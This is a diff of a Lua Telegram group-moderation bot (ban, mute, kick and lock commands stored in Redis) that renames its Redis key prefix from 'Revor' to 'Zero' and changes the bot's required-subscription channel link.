@@ -5083,10 +5086,10 @@ end
 if StatusCanOrNotCan(msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId) then
+if Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId) 
+Redis:sadd(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم حظره من المجموعه ").Reply,"md",true)  
 end
@@ -5097,7 +5100,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5110,10 +5113,10 @@ local UserInfo = LuaTele.getUser(UserId)
 if UserInfo.luatele == "error" and UserInfo.code == 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId) then
+if not Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanGroup:Group"..msg_chat_id,UserId) 
+Redis:srem(Zero .."Zero :BanGroup:Group"..msg_chat_id,UserId) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء حظره من المجموعه  ").Reply,"md",true)  
 end
@@ -5125,7 +5128,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).Delmsg == false then
@@ -5138,10 +5141,10 @@ end
 if StatusSilent(msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId) then
+if Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم كتمه في المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم كتمه في المجموعه  ").Reply,"md",true)  
 end
 end
@@ -5151,17 +5154,17 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserInfo = LuaTele.getUser(UserId)
 if UserInfo.luatele == "error" and UserInfo.code == 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId) then
+if not Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:SilentGroup:Group"..msg_chat_id,UserId) 
+Redis:srem(Zero .."Zero :SilentGroup:Group"..msg_chat_id,UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 end
 end
@@ -5172,7 +5175,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5181,7 +5184,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserInfo = LuaTele.getUser(UserId)
@@ -5201,7 +5204,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5224,7 +5227,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5233,7 +5236,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserInfo = LuaTele.getUser(UserId)
@@ -5247,26 +5250,26 @@ LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم طرده من المجموعه ").Reply,"md",true)  
 end
 if text == "نزلني" then
-if not Redis:get(Revor.."Revor:Status:remMe"..msg_chat_id) then
+if not Redis:get(Zero .."Zero :Status:remMe"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙امر نزلني تم تعطيله من قبل المدراء *","md",true)  
 end
 if The_ControllerAll(msg.sender.user_id) == true then
 Rink = 1
-elseif Redis:sismember(Revor.."Revor:DevelopersQ:Groups",msg.sender.user_id)  then
+elseif Redis:sismember(Zero .."Zero :DevelopersQ:Groups",msg.sender.user_id)  then
 Rink = 2
-elseif Redis:sismember(Revor.."Revor:Developers:Groups",msg.sender.user_id)  then
+elseif Redis:sismember(Zero .."Zero :Developers:Groups",msg.sender.user_id)  then
 Rink = 3
-elseif Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 4
-elseif Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 5
-elseif Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 6
-elseif Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 7
-elseif Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 8
-elseif Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id, msg.sender.user_id) then
+elseif Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id, msg.sender.user_id) then
 Rink = 9
 else
 Rink = 10
@@ -5277,14 +5280,14 @@ end
 if Rink <= 7  then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙استطيع تنزيل الادمنيه والمميزين فقط","md",true) 
 else
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, msg.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, msg.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, msg.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تنزيلك من الادمنيه والمميزين ","md",true) 
 end
 end
 
 if text == "اطردني" or text == "طردني" then
-if not Redis:get(Revor.."Revor:Status:KickMe"..msg_chat_id) then
+if not Redis:get(Zero .."Zero :Status:KickMe"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙امر اطردني تم تعطيله من قبل المدراء *","md",true)  
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5316,7 +5319,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5345,7 +5348,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5358,10 +5361,10 @@ y = 0
 for k, v in pairs(List_Members) do
 if Info_Members.members[k].bot_info == nil then
 if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
-Redis:sadd(Revor.."Revor:TheBasics:Group"..msg_chat_id,v.member_id.user_id) 
+Redis:sadd(Zero .."Zero :TheBasics:Group"..msg_chat_id,v.member_id.user_id) 
 x = x + 1
 else
-Redis:sadd(Revor.."Revor:Addictive:Group"..msg_chat_id,v.member_id.user_id) 
+Redis:sadd(Zero .."Zero :Addictive:Group"..msg_chat_id,v.member_id.user_id) 
 y = y + 1
 end
 end
@@ -5398,7 +5401,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5428,7 +5431,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5461,11 +5464,11 @@ if text == "غادر" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:LeftBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :LeftBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 LuaTele.sendText(msg_chat_id,msg_id,"*\n⌔︙تم مغادرة المجموعه بامر من المطور *","md",true)  
@@ -5476,7 +5479,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
@@ -5498,10 +5501,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:text"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Lock:text"..msg_chat_id,true) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الدردشه").Lock,"md",true)  
 return false
 end 
@@ -5510,10 +5513,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:AddMempar"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:AddMempar"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل اضافة الاعضاء").Lock,"md",true)  
 return false
 end 
@@ -5522,10 +5525,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:Join"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Join"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل دخول الاعضاء").Lock,"md",true)  
 return false
 end 
@@ -5534,10 +5537,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:Bot:kick"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Bot:kick"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل البوتات").Lock,"md",true)  
 return false
 end 
@@ -5546,10 +5549,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:Bot:kick"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Bot:kick"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل البوتات").lockKick,"md",true)  
 return false
 end 
@@ -5558,10 +5561,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end  
-Redis:set(Revor.."Revor:Lock:tagservr"..msg_chat_id,true)  
+Redis:set(Zero .."Zero :Lock:tagservr"..msg_chat_id,true)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الاشعارات").Lock,"md",true)  
 return false
 end 
@@ -5570,10 +5573,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end  
-Redis:set(Revor.."Revor:lockpin"..msg_chat_id,(LuaTele.getChatPinnedMessage(msg_chat_id).id or true)) 
+Redis:set(Zero .."Zero :lockpin"..msg_chat_id,(LuaTele.getChatPinnedMessage(msg_chat_id).id or true)) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التثبيت هنا").Lock,"md",true)  
 return false
 end 
@@ -5582,10 +5585,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:edit"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Lock:edit"..msg_chat_id,true) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل تعديل").Lock,"md",true)  
 return false
 end 
@@ -5594,10 +5597,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:set(Revor.."Revor:Lock:edit"..msg_chat_id,true) 
+Redis:set(Zero .."Zero :Lock:edit"..msg_chat_id,true) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل تعديل").Lock,"md",true)  
 return false
 end 
@@ -5606,13 +5609,13 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end  
-Redis:set(Revor.."Revor:Lock:tagservrbot"..msg_chat_id,true)   
+Redis:set(Zero .."Zero :Lock:tagservrbot"..msg_chat_id,true)   
 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
-Redis:set(Revor..'Revor:'..lock..msg_chat_id,"del")    
+Redis:set(Zero ..'Zero :'..lock..msg_chat_id,"del")    
 end
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل جميع الاوامر").Lock,"md",true)  
 return false
@@ -5625,10 +5628,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:AddMempar"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:AddMempar"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح اضافة الاعضاء").unLock,"md",true)  
 return false
 end 
@@ -5637,10 +5640,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
